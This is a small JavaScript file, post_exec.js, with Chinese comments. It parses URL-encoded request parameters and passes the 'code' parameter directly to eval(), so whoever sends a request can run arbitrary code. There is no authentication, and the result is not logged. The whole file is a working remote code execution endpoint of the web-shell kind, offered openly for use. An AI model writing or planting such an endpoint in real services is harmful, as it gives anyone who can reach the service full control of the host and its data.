// post_exec.js - 接收POST数据并作为JS代码执行

// 解析URL参数（修正版，+号还原为空格）
function parseParams(paramsStr) {
    if (!paramsStr || paramsStr.length === 0) {
        return {};
    }
    const params = {};
    const pairs = paramsStr.split('&');
    for (const pair of pairs) {
        const [key, value] = pair.split('=');
        if (key && value) {
            params[decodeURIComponent(key)] = decodeURIComponent(value.replace(/\+/g, ' '));
        }
    }
    return params;
}

// 解析参数
const parsedParams = parseParams(request_params);

if (parsedParams.code) {
    try {
        const result = eval(parsedParams.code);
        // console.log("执行成功，结果:", result);
    } catch (error) {
        console.log("执行失败:", error.message);
    }
} else if (parsedParams.action === 'test') {
    console.log("测试成功");
} else {
    console.log("请使用code参数提供要执行的JavaScript代码");
}
